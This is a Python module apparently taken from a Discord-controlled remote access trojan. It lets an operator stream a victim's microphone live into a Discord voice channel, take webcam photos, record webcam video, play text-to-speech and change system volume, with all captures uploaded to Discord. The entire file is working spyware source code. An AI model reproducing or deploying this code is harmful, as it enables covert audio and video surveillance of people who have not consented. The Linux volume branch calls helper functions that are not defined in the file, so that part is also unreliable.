"""
commands/audio.py - TTS, microphone streaming, volume control, and webcam/video tools.
"""

import os
import re
import asyncio
import platform
import subprocess
import requests
import time
import tempfile

import cv2
import discord
import pyttsx3
import numpy as np
import sounddevice as sd
from discord.ext import commands
from discord.ext.commands import MissingRequiredArgument

from config import IS_WINDOWS, TEMP_DIR, bot, channel_ids
from utils import (
    current_time,
    generic_command_error,
    in_correct_channel,
    is_authorized,
    log_message,
    wrong_channel,
)

if IS_WINDOWS:
    from config import CLSCTX_ALL, AudioUtilities, IAudioEndpointVolume


# ── Opus loading ───────────────────────────────────────────────────────────
def _load_opus():
    if IS_WINDOWS:
        url = (
            "https://github.com/truelockmc/Discord-RAT/raw/refs/heads/main/libopus.dll"
        )
        path = os.path.join(TEMP_DIR, "libopus.dll")
        if not os.path.exists(path):
            with open(path, "wb") as f:
                f.write(requests.get(url).content)
            print(f"{path} downloaded.")
        discord.opus.load_opus(path)
    else:
        if not discord.opus.is_loaded():
            import ctypes.util as _cu

            for lib in [_cu.find_library("opus"), "libopus.so.0", "libopus.so", "opus"]:
                if not lib:
                    continue
                try:
                    discord.opus.load_opus(lib)
                    print(f"Loaded opus: {lib}")
                    break
                except Exception:
                    continue
            if not discord.opus.is_loaded():
                print("WARNING: Could not load libopus, voice will not work.")


_load_opus()


# ── Audio source ───────────────────────────────────────────────────────────
class MicrophonePCM(discord.AudioSource):
    """Streams microphone input via sounddevice as 48kHz/16-bit Mono PCM."""

    def __init__(self, channels=1, rate=48000, chunk=960, device=None):
        self._chunk = chunk
        try:
            self._stream = sd.RawInputStream(
                samplerate=rate,
                channels=channels, 
                dtype="int16",
                blocksize=chunk,
                device=device,
            )
            self._stream.start()
        except Exception as e:
            print(f"Failed to start stream: {e}")
            raise e

    def read(self) -> bytes:
        data, _ = self._stream.read(self._chunk)
        audio_data = np.frombuffer(data, dtype=np.int16)
        stereo_data = np.repeat(audio_data, 2)
        return stereo_data.tobytes()

    def cleanup(self):
        if hasattr(self, '_stream'):
            self._stream.stop()
            self._stream.close()


# ── macOS Volume Helpers (AppleScript) ─────────────────────────────────────
def _mac_get_volume() -> int:
    result = subprocess.run(["osascript", "-e", "output volume of (get volume settings)"], capture_output=True, text=True)
    return int(result.stdout.strip()) if result.stdout.strip() else 0

def _mac_is_muted() -> bool:
    result = subprocess.run(["osascript", "-e", "output muted of (get volume settings)"], capture_output=True, text=True)
    return "true" in result.stdout.lower()

def _mac_set_volume(pct: int):
    subprocess.run(["osascript", "-e", f"set volume output volume {pct}"])

def _mac_set_mute(mute: bool):
    val = "true" if mute else "false"
    subprocess.run(["osascript", "-e", f"set volume muted {val}"])
    

# ── Windows volume helper ──────────────────────────────────────────────────
def _win_get_device():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    return interface.QueryInterface(IAudioEndpointVolume)


# ── Cog ────────────────────────────────────────────────────────────────────
class AudioCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    # ── TTS ────────────────────────────────────────────────────────────────
    @commands.command()
    @commands.check(is_authorized)
    async def tts(self, ctx, *, message):
        if not in_correct_channel(ctx):
            await wrong_channel(ctx)
            return
        try:
            engine = pyttsx3.init()
            engine.say(message)
            engine.runAndWait()
            await log_message(ctx, f"🔊 **Text-to-Speech message played:** {message}")
        except Exception as e:
            await log_message(
                ctx, f"❌ **Error playing TTS message:** {e}", duration=10
            )

    @tts.error
    async def tts_error(self, ctx, error):
        if isinstance(error, MissingRequiredArgument):
            await log_message(
                ctx, "❌ **Error:** Please provide a message.", duration=10
            )
        else:
            await log_message(ctx, f"❌ **Error:** {error}", duration=10)

    # ── Mic stream ─────────────────────────────────────────────────────────
    @commands.command()
    @commands.check(is_authorized)
    async def mic_stream_start(self, ctx):
        if not in_correct_channel(ctx):
            await wrong_channel(ctx)
            return
        if "voice" not in channel_ids:
            await ctx.send(
                f"`[{current_time()}] Voice channel ID is not set.`", delete_after=10
            )
            return
        vc_channel = discord.utils.get(
            ctx.guild.voice_channels, id=channel_ids["voice"]
        )
        if vc_channel is None:
            await ctx.send(
                f"`[{current_time()}] Voice channel not found.`", delete_after=10
            )
            return
        vc = await vc_channel.connect(self_deaf=True)
        vc.play(MicrophonePCM())
        await ctx.send(
            f"`[{current_time()}] Joined voice channel and streaming microphone in realtime`"
        )
        print(f"[{current_time()}] Started streaming microphone")

    @mic_stream_start.error
    async def mic_stream_start_error(self, ctx, error):
        await generic_command_error(ctx, error)

    @commands.command()
    @commands.check(is_authorized)
    async def mic_stream_stop(self, ctx):
        if ctx.voice_client is None:
            await ctx.send(
                f"`[{current_time()}] Bot is not in a voice channel.`", delete_after=10
            )
            return
        if isinstance(ctx.voice_client.source, MicrophonePCM):
            ctx.voice_client.source.cleanup()
        await ctx.voice_client.disconnect()
        await ctx.send(f"`[{current_time()}] Left voice channel.`", delete_after=10)

    @mic_stream_stop.error
    async def mic_stream_stop_error(self, ctx, error):
        await generic_command_error(ctx, error)

    # ── Volume ─────────────────────────────────────────────────────────────
    @commands.command(name="volume")
    @commands.check(is_authorized)
    async def volume(self, ctx, *args):
        if not in_correct_channel(ctx):
            await wrong_channel(ctx)
            return

        if IS_WINDOWS:
            vol = _win_get_device()
            get_vol = lambda: int(vol.GetMasterVolumeLevelScalar() * 100)
            get_mute = lambda: vol.GetMute()
            set_vol = lambda pct: vol.SetMasterVolumeLevelScalar(pct / 100.0, None)
            set_mute = lambda m: vol.SetMute(1 if m else 0, None)
        elif platform.system() == "Darwin":
            get_vol = _mac_get_volume
            get_mute = _mac_is_muted
            set_vol = _mac_set_volume
            set_mute = _mac_set_mute
        else:
            get_vol = _linux_get_volume
            get_mute = _linux_is_muted
            set_vol = _linux_set_volume
            set_mute = _linux_set_mute

        if not args:
            mute_status = "Muted 🔇" if get_mute() else "Unmuted 🔊"
            await ctx.send(
                f"🎵 **Audio Device Info:**\n"
                f"Current Volume: {get_vol()}%\nStatus: {mute_status}\n\n"
                f"**Usage:**\n"
                f"`!volume [0-100]` - Set volume\n"
                f"`!volume mute` / `!volume unmute` - Toggle mute"
            )
        elif args[0].isdigit():
            pct = int(args[0])
            if not 0 <= pct <= 100:
                msg = await ctx.send("❌ **Error:** Volume must be between 0 and 100.")
                await msg.delete(delay=10)
                return
            set_vol(pct)
            await ctx.send(f"🔊 **Volume set to {pct}%**")
        elif args[0] == "mute":
            if get_mute():
                msg = await ctx.send("❌ **Error:** Already muted.")
                await msg.delete(delay=10)
                return
            set_mute(True)
            await ctx.send("🔇 **Audio has been muted.**")
        elif args[0] == "unmute":
            if not get_mute():
                msg = await ctx.send("❌ **Error:** Already unmuted.")
                await msg.delete(delay=10)
                return
            set_mute(False)
            await ctx.send("🔊 **Audio has been unmuted.**")
        else:
            msg = await ctx.send("❌ **Error:** Invalid command.")
            await msg.delete(delay=10)

    # ── Webcam & Video Capture ─────────────────────────────────────────────
    @commands.command()
    @commands.check(is_authorized)
    async def webcam(self, ctx):
        """Captures a single image from the webcam and uploads it."""
        if not in_correct_channel(ctx):
            await wrong_channel(ctx)
            return

        await ctx.send(f"`[{current_time()}] Snapping photo...`")
        file_path = os.path.join(TEMP_DIR, "webcam_snap.png")

        try:
            await asyncio.to_thread(self._capture_photo, file_path)
            
            if os.path.exists(file_path):
                await ctx.send(
                    f"`[{current_time()}] Photo captured successfully:`", 
                    file=discord.File(file_path)
                )
                os.remove(file_path)
            else:
                await ctx.send(f"`[{current_time()}] Failed to save photo.`")
        except Exception as e:
            await log_message(ctx, f"❌ **Error capturing webcam:** {e}", duration=10)

    @webcam.error
    async def webcam_error(self, ctx, error):
        await generic_command_error(ctx, error)

    @commands.command()
    @commands.check(is_authorized)
    async def video_stream_start(self, ctx, duration: int = 5):
        """Captures a video clip from the webcam and uploads it."""
        if not in_correct_channel(ctx):
            await wrong_channel(ctx)
            return

        if duration > 120:
            await ctx.send("❌ **Error:** Please keep the video duration under 120 seconds.")
            return

        await ctx.send(f"`[{current_time()}] Recording {duration} seconds of video...`")
        file_path = os.path.join(TEMP_DIR, "webcam_stream.mp4")

        try:
            # The record worker dynamically returns the working asset path depending on the fallback used
            final_path = await asyncio.to_thread(self._record_video, file_path, duration)
            
            if final_path and os.path.exists(final_path):
                # Ensure it's greater than 10KB to confirm structural video contents exist
                if os.path.getsize(final_path) > 10000:
                    await ctx.send(
                        f"`[{current_time()}] Video recording complete:`", 
                        file=discord.File(final_path)
                    )
                else:
                    await ctx.send(f"`[{current_time()}] Error: Video stream contains an empty container. Camera may be locked.`")
                os.remove(final_path)
            else:
                await ctx.send(f"`[{current_time()}] Failed to record video stream.`")
        except Exception as e:
            await log_message(ctx, f"❌ **Error recording video:** {e}", duration=10)

    @video_stream_start.error
    async def video_stream_start_error(self, ctx, error):
        await generic_command_error(ctx, error)

    def _capture_photo(self, file_path: str):
        """Worker function for capturing a single webcam frame."""
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            raise Exception("Could not open webcam device connection.")
        
        # Warm up sensor frames
        for _ in range(5):
            cap.read()
            
        ret, frame = cap.read()
        if ret:
            cv2.imwrite(file_path, frame)
        cap.release()
        if not ret:
            raise Exception("Failed to grab a valid frame from webcam.")

    def _record_video(self, file_path: str, duration: int) -> str:
        """Worker function for capturing hardware frames into memory and writing via structural fail-safes."""
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            raise Exception("Could not open webcam device connection.")
        
        # Warm up the camera sensor matrix
        for _ in range(10):
            cap.read()
            
        ret, frame = cap.read()
        if not ret:
            cap.release()
            raise Exception("Camera opened, but failed to extract baseline frame.")
            
        height, width = frame.shape[:2]
        
        frames = []
        start_time = time.time()
        end_time = start_time + duration
        
        # Step 1: Capture stream purely into RAM first to isolate recording from disk write lag
        while time.time() < end_time:
            ret, frame = cap.read()
            if ret:
                if frame.shape[:2] == (height, width):
                    frames.append(frame)
            
        cap.release()
        
        if not frames:
            raise Exception("No active frames captured from hardware sensor.")
            
        actual_duration = time.time() - start_time
        fps = len(frames) / actual_duration if actual_duration > 0 else 24.0
        if fps <= 0:
            fps = 24.0

        # ── TRACK 1: Standard OpenCV MP4 Writer ───────────────────────────
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        out = cv2.VideoWriter(file_path, fourcc, fps, (width, height))
        if out.isOpened():
            for f in frames:
                out.write(f)
            out.release()
            
        if os.path.exists(file_path) and os.path.getsize(file_path) > 10000:
            return file_path
            
        if os.path.exists(file_path):
            try: os.remove(file_path)
            except Exception: pass

        # ── TRACK 2: Local FFmpeg Image Stitching (Silicon Fix) ───────────
        try:
            with tempfile.TemporaryDirectory() as tmpdir:
                for idx, f in enumerate(frames):
                    img_path = os.path.join(tmpdir, f"frame_{idx:04d}.jpg")
                    cv2.imwrite(img_path, f)
                    
                cmd = [
                    "ffmpeg", "-y",
                    "-framerate", str(fps),
                    "-i", os.path.join(tmpdir, "frame_%04d.jpg"),
                    "-c:v", "libx264",
                    "-pix_fmt", "yuv420p",
                    file_path
                ]
                subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
                
            if os.path.exists(file_path) and os.path.getsize(file_path) > 10000:
                return file_path
        except Exception:
            if os.path.exists(file_path):
                try: os.remove(file_path)
                except Exception: pass

        # ── TRACK 3: Native MJPEG Serialization into AVI ──────────────────
        avi_path = file_path.replace(".mp4", ".avi")
        fourcc_avi = cv2.VideoWriter_fourcc(*'MJPG')
        out_avi = cv2.VideoWriter(avi_path, fourcc_avi, fps, (width, height))
        if out_avi.isOpened():
            for f in frames:
                out_avi.write(f)
            out_avi.release()
            
        if os.path.exists(avi_path) and os.path.getsize(avi_path) > 10000:
            return avi_path

        # ── TRACK 4: PIL Animated GIF Payload Fallback ────────────────────
        try:
            from PIL import Image
            pil_frames = [Image.fromarray(cv2.cvtColor(f, cv2.COLOR_BGR2RGB)) for f in frames]
            gif_path = file_path.replace(".mp4", ".gif")
            pil_frames[0].save(
                gif_path,
                save_all=True,
                append_images=pil_frames[1:],
                duration=int(1000 / fps),
                loop=0
            )
            if os.path.exists(gif_path) and os.path.getsize(gif_path) > 10000:
                return gif_path
        except Exception:
            pass

        return ""


async def setup(bot):
    await bot.add_cog(AudioCommands(bot))
